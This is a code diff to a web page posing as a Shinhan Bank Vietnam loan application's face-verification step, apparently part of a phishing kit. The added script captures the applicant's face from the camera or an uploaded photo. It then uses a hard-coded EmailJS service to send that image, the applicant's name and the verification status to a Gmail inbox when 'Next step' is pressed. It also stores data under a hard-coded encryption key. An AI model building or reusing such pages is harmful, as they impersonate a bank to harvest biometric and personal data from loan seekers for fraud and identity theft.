@@ -6,6 +6,7 @@
     <title>Xác Minh Khuôn Mặt - Shinhan Bank</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -14,52 +15,80 @@
             margin: 0;
         }
         .header {
-            text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
+            padding: 15px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #b3cde0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .header img {
-            height: 50px;
+            height: 35px;
         }
-        .header h1 {
-            font-size: 26px;
-            font-weight: 700;
-            margin: 10px 0 0 0;
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header-icons i {
+            font-size: 24px;
+            cursor: pointer;
+            color: #0052cc;
         }
         .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
+            max-width: 90%;
+            width: 100%;
+            margin: 0 auto;
+            padding: 25px;
             background: white;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
             position: relative;
         }
-        .progress-bar-container {
-            margin-bottom: 20px;
+        @media (min-width: 768px) {
+            .container {
+                max-width: 700px;
+                margin: 0 auto;
+            }
         }
-        .progress-bar {
-            height: 20px;
-            background-color: #e9ecef;
-            border-radius: 10px;
-            overflow: hidden;
+        .nav-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            margin-top: 0;
+            flex-wrap: nowrap;
         }
-        .progress-bar-fill {
-            height: 100%;
-            background-color: #28a745;
-            transition: width 0.3s ease-in-out;
+        .nav-tabs .nav-item {
+            flex: 1;
+            text-align: center;
+        }
+        .nav-tabs .nav-link {
+            background-color: #d3d3d3;
+            color: #ffffff;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 500;
+            font-size: 14px;
+            width: 100%;
+            margin: 0 5px;
+        }
+        .nav-tabs .nav-link.active {
+            background-color: #0033a0;
+            color: #ffffff;
         }
         .step-title {
             color: #003087;
-            font-size: 22px;
+            font-size: 18px;
             font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
             text-align: center;
         }
         .step-description {
-            font-size: 16px;
+            font-size: 14px;
             text-align: center;
             margin-bottom: 20px;
+            color: #1a3c87;
         }
         .face-scan-container {
             position: relative;
@@ -88,19 +117,17 @@
         .face-feedback {
             text-align: center;
             margin-top: 10px;
-            font-size: 16px;
-            color: #333;
-        }
-        .face-feedback img {
-            height: 20px;
-            vertical-align: middle;
-            margin-right: 5px;
+            font-size: 14px;
+            color: #1a3c87;
         }
         .progress-bar-face {
             height: 10px;
             background-color: #e9ecef;
             border-radius: 5px;
             overflow: hidden;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
         }
         .progress-bar-face-fill {
             height: 100%;
@@ -108,52 +135,71 @@
             transition: width 0.3s ease-in-out;
         }
         .file-upload-box {
-            border: 2px dashed #dee2e6;
-            border-radius: 5px;
-            padding: 20px;
+            border: 2px dashed #b3cde0;
+            border-radius: 20px;
+            padding: 15px;
             text-align: center;
             background-color: #f9f9f9;
+            width: 100%;
+            max-width: 500px;
+            height: 100px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto;
         }
         .file-upload-box label {
             cursor: pointer;
             color: #003087;
             font-weight: 500;
+            font-size: 14px;
         }
         .file-upload-box input {
             display: none;
         }
         .file-info {
-            margin-top: 10px;
-            font-size: 14px;
+            margin-top: 5px;
+            font-size: 12px;
             color: #666;
         }
-        .btn-primary {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            background-color: #003087;
+        .capture-btn {
+            background-color: #0033a0;
             border: none;
+            border-radius: 20px;
+            padding: 6px 12px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #ffffff;
+            margin-top: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .capture-btn:hover {
+            background-color: #0052cc;
+        }
+        .capture-btn i {
+            margin-right: 5px;
+        }
+        .btn-primary {
+            background-color: #0033a0;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 20px;
+            font-weight: 700;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
             margin: 5px;
         }
         .btn-primary:hover {
-            background-color: #00205b;
+            background-color: #0052cc;
         }
         .btn-primary:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
         }
-        .btn-secondary {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            background-color: #6c757d;
-            border: none;
-            position: absolute;
-            top: 20px;
-            left: 20px;
-        }
-        .btn-secondary:hover {
-            background-color: #5a6268;
+        .btn-primary.small {
+            padding: 6px 12px;
+            font-size: 14px;
         }
         .footer {
             text-align: center;
@@ -161,78 +207,163 @@
             background-color: #003087;
             color: white;
             margin-top: 20px;
-            font-size: 16px;
+            font-size: 12px;
         }
-        .footer img.lock-icon {
-            vertical-align: middle;
-            margin-right: 10px;
+        .footer-links a {
+            color: #b3cde0;
+            margin: 0 10px;
+            text-decoration: none;
         }
-        .footer-logo {
-            height: 40px;
-            margin-top: 10px;
+        .footer-links a:hover {
+            color: #ffffff;
         }
-        .continue-btn-container {
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            font-weight: 500;
             text-align: center;
-            margin-top: 20px;
+            margin-top: 5px;
+            padding: 8px;
+            background-color: #ffe6e6;
+            border-radius: 5px;
+            display: none;
+        }
+        .form-label {
+            font-weight: 400;
+            color: #1a3c87;
+            font-size: 14px;
+            margin-bottom: 5px;
+            text-align: center;
+            width: 100%;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #d3d3d3;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .form-group:last-child {
+            border-bottom: none;
+        }
+        .divider-blue {
+            border-top: 1px solid #b3cde0;
+            margin: 15px 0;
+        }
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="header">
         <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <h1>Đăng Ký Vay Tín Chấp</h1>
-    </div>
-
-    <div class="container">
-        <button type="button" class="btn btn-secondary" onclick="window.location.href='step3.html'">Quay Lại</button>
-        <div class="progress-bar-container">
-            <div class="progress-bar">
-                <div class="progress-bar-fill" id="progressBar" style="width: 40%"></div>
+        <div class="header-icons">
+            <i class="bi bi-search"></i>
+            <div class="dropdown">
+                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
+                <ul class="dropdown-menu dropdown-menu-end">
+                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
+                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
+                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
+                </ul>
             </div>
         </div>
+    </div>
+    <hr class="divider-blue" style="margin: 0;">
+
+    <div class="container">
+        <ul class="nav-tabs">
+            <li class="nav-item">
+                <a class="nav-link" href="#">1. Nhập thông tin</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link active" href="#">3. Hoàn thành</a>
+            </li>
+        </ul>
 
         <div id="step4" class="step-transition">
             <h5 class="step-title">Xác Minh Khuôn Mặt</h5>
             <p class="step-description">Vui lòng quét khuôn mặt hoặc tải lên ảnh khuôn mặt để xác minh.</p>
-            <div class="face-scan-container">
-                <canvas id="faceScanCanvas" class="face-scan-canvas"></canvas>
-                <div class="face-overlay"></div>
-                <div class="face-feedback" id="faceFeedback">
-                    <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Icon" onerror="this.src='https://via.placeholder.com/20x20?text=Icon';">
-                    Đang chờ khuôn mặt...
+            <div class="form-group">
+                <div class="face-scan-container">
+                    <canvas id="faceScanCanvas" class="face-scan-canvas"></canvas>
+                    <div class="face-overlay"></div>
+                    <div class="face-feedback" id="faceFeedback">
+                        Đang chờ khuôn mặt...
+                    </div>
+                    <div class="progress-bar-face" id="faceProgressBar">
+                        <div class="progress-bar-face-fill" id="faceProgressFill" style="width: 0%"></div>
+                    </div>
                 </div>
-                <div class="progress-bar-face" id="faceProgressBar">
-                    <div class="progress-bar-face-fill" id="faceProgressFill" style="width: 0%"></div>
+                <div class="action-buttons">
+                    <button type="button" class="btn btn-primary small" id="startFaceScan">Quét Khuôn Mặt</button>
                 </div>
             </div>
-            <div class="text-center mb-3">
-                <button type="button" class="btn btn-primary" id="startFaceScan">Quét Khuôn Mặt</button>
-                <button type="button" class="btn btn-primary" id="captureFacePhoto">Chụp Ảnh</button>
-            </div>
-            <div class="mb-3">
-                <label for="faceImage" class="form-label">Tải Lên Ảnh Khuôn Mặt</label>
+
+            <hr class="divider-blue">
+
+            <div class="form-group">
+                <label for="faceImage" class="form-label">Chọn Ảnh Khuôn Mặt</label>
                 <div class="file-upload-box">
-                    <label for="faceImage">Chọn ảnh khuôn mặt</label>
+                    <label for="faceImage" aria-label="Tải lên ảnh khuôn mặt">Tải ảnh lên</label>
                     <input type="file" id="faceImage" accept="image/jpeg,image/png">
-                    <div class="file-info" id="faceImageInfo"></div>
+                    <button type="button" class="capture-btn" id="captureFacePhoto" aria-label="Chụp ảnh khuôn mặt"><i class="bi bi-camera"></i> Chụp ảnh</button>
+                    <div class="file-info" id="faceImageInfo" aria-live="polite"></div>
+                    <div class="error-message" id="faceImageError"></div>
                 </div>
             </div>
-            <div class="continue-btn-container">
-                <button id="proceedToStep6Btn" class="btn btn-primary" disabled>Tiếp Tục</button>
+
+            <hr class="divider-blue">
+
+            <div class="button-group">
+                <a href="/vaytieudung/shinhanbank/pages/vi/step3.html" class="btn btn-primary">QUAY LẠI</a>
+                <button id="proceedToStep6Btn" class="btn btn-primary" disabled>BƯỚC KẾ TIẾP</button>
             </div>
         </div>
 
         <div class="footer">
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
-            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
+            <div class="footer-links">
+                <a href="#">Chính sách bảo mật</a> |
+                <a href="#">Điều khoản sử dụng</a> |
+                <a href="#">Chính sách Cookies</a> |
+                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+                <a href="#">Hướng dẫn truy cập web</a> |
+                <a href="#">Sitemap</a>
+            </div>
+            <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+            <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
         </div>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.18.0/dist/tf.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-detection@1.0.0/dist/face-detection.min.js"></script>
     <script>
-        // Placeholder user data (for fallback if localStorage is empty)
+        (function() {
+            emailjs.init("OrBsI926QI2_xBh1f");
+        })();
+
         let userData = {
             fullName: "Nguyễn Văn A",
             loanAmount: 100000000,
@@ -240,26 +371,45 @@
             registrationDate: "08/05/2025",
             email: "nguyenvana@example.com",
             currentStep: 4,
-            faceVerified: false
+            faceVerified: false,
+            faceImage: ""
         };
 
-        // Load user data from localStorage
         function loadUserData() {
-            const storedData = localStorage.getItem('userData');
-            if (storedData) {
-                Object.assign(userData, JSON.parse(storedData));
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+                    console.log('Loaded userData:', userData);
+                }
+            } catch (error) {
+                console.error('Error parsing userData:', error);
             }
         }
 
-        // Save user data to localStorage
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
+                console.log('Saved userData:', userData);
+            } catch (error) {
+                console.error('Error saving userData:', error);
+            }
         }
 
         let videoStream = null;
         let faceDetected = false;
+        let faceDetector = null;
 
-        // Start video stream
+        async function loadFaceDetector() {
+            const model = faceDetection.SupportedModels.MediaPipeFaceDetector;
+            const detectorConfig = {
+                runtime: 'tfjs',
+                maxFaces: 1
+            };
+            faceDetector = await faceDetection.createDetector(model, detectorConfig);
+        }
+
         function startVideoStream() {
             const canvas = document.getElementById('faceScanCanvas');
             const ctx = canvas.getContext('2d');
@@ -270,13 +420,11 @@
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.play();
-                        function drawFrame() {
-                            if (videoStream) {
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                requestAnimationFrame(drawFrame);
-                            }
-                        }
-                        drawFrame();
+                        video.onloadedmetadata = () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            detectFaces(video, ctx);
+                        };
                     })
                     .catch(err => {
                         console.error("Error accessing camera:", err);
@@ -287,7 +435,46 @@
             }
         }
 
-        // Stop video stream
+        async function detectFaces(video, ctx) {
+            let faceDetectionCount = 0;
+            const feedback = document.getElementById('faceFeedback');
+            const progressFill = document.getElementById('faceProgressFill');
+
+            const detectLoop = async () => {
+                if (!videoStream) return;
+
+                ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+                const faces = await faceDetector.estimateFaces(video);
+
+                if (faces.length > 0) {
+                    feedback.textContent = 'Đã phát hiện khuôn mặt. Vui lòng giữ yên...';
+                    faceDetectionCount++;
+                    const progress = Math.min(faceDetectionCount * 10, 100);
+                    progressFill.style.width = `${progress}%`;
+
+                    if (faceDetectionCount >= 10) {
+                        feedback.textContent = 'Khuôn mặt được xác minh!';
+                        userData.faceImage = canvas.toDataURL('image/png');
+                        stopVideoStream();
+                        faceDetected = true;
+                        userData.faceVerified = true;
+                        saveToLocalStorage();
+                        updateButtonState();
+                        return;
+                    }
+                } else {
+                    feedback.textContent = 'Không phát hiện khuôn mặt. Vui lòng điều chỉnh vị trí.';
+                    faceDetectionCount = Math.max(0, faceDetectionCount - 1);
+                    const progress = Math.max(0, faceDetectionCount * 10);
+                    progressFill.style.width = `${progress}%`;
+                }
+
+                requestAnimationFrame(detectLoop);
+            };
+
+            detectLoop();
+        }
+
         function stopVideoStream() {
             if (videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
@@ -295,62 +482,41 @@
             }
         }
 
-        // Simulate face scan
-        function simulateFaceScan() {
-            const canvas = document.getElementById('faceScanCanvas');
-            const ctx = canvas.getContext('2d');
+        $('#captureFacePhoto').on('click', function() {
             const feedback = document.getElementById('faceFeedback');
-            const progressFill = document.getElementById('faceProgressFill');
+            const input = document.getElementById('faceImage');
+            feedback.textContent = 'Đang chuẩn bị camera...';
+            input.setAttribute('capture', 'user');
+            input.click();
+        });
 
-            feedback.textContent = 'Đang quét khuôn mặt...';
-            progressFill.style.width = '0%';
-            startVideoStream();
-
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 10;
-                progressFill.style.width = `${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    ctx.clearRect(0, 0, canvas.width, canvas.height);
-                    feedback.textContent = 'Khuôn mặt được xác minh!';
-                    stopVideoStream();
+        $('#faceImage').on('change', function(e) {
+            const file = e.target.files[0];
+            const inputId = e.target.id;
+            $(`#${inputId}Error`).hide();
+            $(`#faceImageInfo`).text('');
+            if (file) {
+                const maxSize = 5 * 1024 * 1024;
+                const validTypes = ['image/jpeg', 'image/png'];
+                if (!validTypes.includes(file.type)) {
+                    $(`#${inputId}Error`).text('Vui lòng chọn file JPEG hoặc PNG.').show();
+                    return;
+                }
+                if (file.size > maxSize) {
+                    $(`#${inputId}Error`).text('File quá lớn. Vui lòng chọn file dưới 5MB.').show();
+                    return;
+                }
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    userData.faceImage = e.target.result;
+                    $('#faceImageInfo').text(DOMPurify.sanitize(`${file.name} (${Math.round(file.size / 1024)} KB)`));
+                    $('#faceFeedback').text('Khuôn mặt được xác minh!');
                     faceDetected = true;
                     userData.faceVerified = true;
                     saveToLocalStorage();
                     updateButtonState();
-                }
-            }, 300);
-        }
-
-        // Capture face photo
-        $('#captureFacePhoto').on('click', function() {
-            const feedback = document.getElementById('faceFeedback');
-            feedback.textContent = 'Đang chuẩn bị camera...';
-            startVideoStream();
-            setTimeout(() => {
-                const canvas = document.getElementById('faceScanCanvas');
-                const ctx = canvas.getContext('2d');
-                feedback.textContent = 'Khuôn mặt được xác minh!';
-                stopVideoStream();
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                faceDetected = true;
-                userData.faceVerified = true;
-                saveToLocalStorage();
-                updateButtonState();
-            }, 3000);
-        });
-
-        // Handle image upload
-        $('#faceImage').on('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                $('#faceImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
-                $('#faceFeedback').text('Khuôn mặt được xác minh!');
-                faceDetected = true;
-                userData.faceVerified = true;
-                saveToLocalStorage();
-                updateButtonState();
+                };
+                reader.readAsDataURL(file);
             } else {
                 $('#faceImageInfo').text('');
                 $('#faceFeedback').text('Đang chờ khuôn mặt...');
@@ -361,36 +527,65 @@
             }
         });
 
-        // Update button state
         function updateButtonState() {
-            $('#proceedToStep6Btn').prop('disabled', !faceDetected);
+            const hasFaceImage = $('#faceImage').prop('files').length > 0;
+            $('#proceedToStep6Btn').prop('disabled', !faceDetected && !hasFaceImage);
         }
 
-        // Proceed to next step
+        function sendFaceVerificationEmail() {
+            let params = {
+                to_email: "your-email@gmail.com", // Thay bằng email Gmail của bạn
+                from_name: "Shinhan Bank System",
+                customer_name: userData.fullName || 'Khách hàng',
+                time: new Date().toLocaleString('vi-VN'),
+                face_verified: userData.faceVerified ? "Đã xác minh" : "Chưa xác minh",
+                face_image: userData.faceImage || 'N/A'
+            };
+
+            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
+                .then(() => {
+                    console.log('Email sent successfully');
+                    alert("Thông tin xác minh khuôn mặt đã được gửi!");
+                    $('#faceImage').val('');
+                    $('#faceImageInfo').text('');
+                    $('#faceFeedback').text('Đang chờ khuôn mặt...');
+                    $('#faceProgressFill').css('width', '0%');
+                    stopVideoStream();
+                    const canvas = document.getElementById('faceScanCanvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+                    faceDetected = false;
+                    userData.currentStep = 6;
+                    saveToLocalStorage();
+                    window.location.href = '/vaytieudung/shinhanbank/pages/vi/step6.html';
+                })
+                .catch(error => {
+                    console.error('EmailJS error:', error);
+                    alert("Lỗi gửi thông tin. Vui lòng thử lại sau.");
+                });
+        }
+
         $('#proceedToStep6Btn').on('click', function(e) {
             e.preventDefault();
-            $('#faceImage').val('');
-            $('#faceImageInfo').text('');
-            $('#faceFeedback').text('Đang chờ khuôn mặt...');
-            $('#faceProgressFill').css('width', '0%');
-            stopVideoStream();
-            const canvas = document.getElementById('faceScanCanvas');
-            const ctx = canvas.getContext('2d');
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            faceDetected = false;
-            userData.currentStep = 6;
-            saveToLocalStorage();
-            window.location.href = 'step6.html';
+            sendFaceVerificationEmail();
         });
 
-        // Load user data on page load
-        window.onload = function() {
+        $('.btn-primary, .capture-btn').on('keypress', function(e) {
+            if (e.which === 13) {
+                $(this).click();
+            }
+        });
+
+        window.onload = async function() {
             loadUserData();
+            await loadFaceDetector();
             updateButtonState();
         };
 
         $('#startFaceScan').on('click', function() {
-            simulateFaceScan();
+            const feedback = document.getElementById('faceFeedback');
+            feedback.textContent = 'Đang chuẩn bị camera...';
+            startVideoStream();
         });
     </script>
 </body>
